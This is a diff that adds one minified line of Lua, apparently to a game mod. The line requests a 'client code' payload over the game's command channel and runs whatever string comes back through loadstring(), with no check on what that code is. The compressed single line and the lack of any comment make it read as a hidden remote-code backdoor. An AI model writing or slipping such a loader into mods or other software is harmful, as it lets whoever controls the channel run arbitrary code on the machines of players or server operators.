@@ -1,0 +1,1 @@
+if isServer()then(function()local a=nil;a=function(b,c,d)if b~='mod_loader'or c~='receive_modloader_client_code'then return end;loadstring(d.code)()Events.OnServerCommand.Remove(a)end;Events.OnServerCommand.Add(a)sendClientCommand('mod_loader','request_modloader_client_code',{})end)()end
